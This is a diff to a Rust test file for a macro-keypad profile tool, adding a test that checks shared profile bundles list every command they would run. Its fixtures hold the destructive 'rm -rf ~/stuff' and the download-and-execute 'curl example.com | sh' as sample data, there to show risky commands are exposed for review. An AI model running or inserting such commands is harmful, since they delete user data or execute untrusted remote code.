@@ -193,3 +193,59 @@ fn keep_rules_false_clears_match() {
     import(&other, &b, &o).expect("import");
     assert!(other.load_profile(p.id).expect("load").r#match.apps.is_empty());
 }
+
+#[test]
+fn bundles_list_the_commands_they_would_run() {
+    use ulanzi_core::model::*;
+    let mut p = Profile::new_default("Shared", Model::D200X);
+    p.pages[0].keys.insert(
+        0,
+        Key {
+            tap: Some(Action::Command {
+                cmd: "rm -rf ~/stuff".into(),
+                terminal: false,
+            }),
+            hold: Some(Action::Multi {
+                steps: vec![Step {
+                    action: Action::LaunchApp {
+                        desktop_id: None,
+                        exec: Some("curl example.com | sh".into()),
+                    },
+                    delay_ms: 0,
+                }],
+            }),
+            ..Key::default()
+        },
+    );
+    p.screen = ScreenConfig::custom(
+        vec![Widget::Command {
+            cmd: "uptime".into(),
+            every_s: 30,
+            title: String::new(),
+        }],
+        None,
+        None,
+    );
+    let b = ulanzi_core::bundle::Bundle {
+        manifest: ulanzi_core::bundle::Manifest {
+            format: ulanzi_core::bundle::FORMAT,
+            app_version: "2.0.0".into(),
+            created: String::new(),
+            includes_settings: false,
+            profiles: vec![],
+        },
+        profiles: vec![ulanzi_core::bundle::BundleProfile {
+            profile: p,
+            icons: vec![],
+        }],
+        settings: None,
+    };
+    assert_eq!(
+        ulanzi_core::bundle::commands(&b),
+        vec![
+            "rm -rf ~/stuff".to_string(),
+            "curl example.com | sh".to_string(),
+            "uptime".to_string()
+        ]
+    );
+}
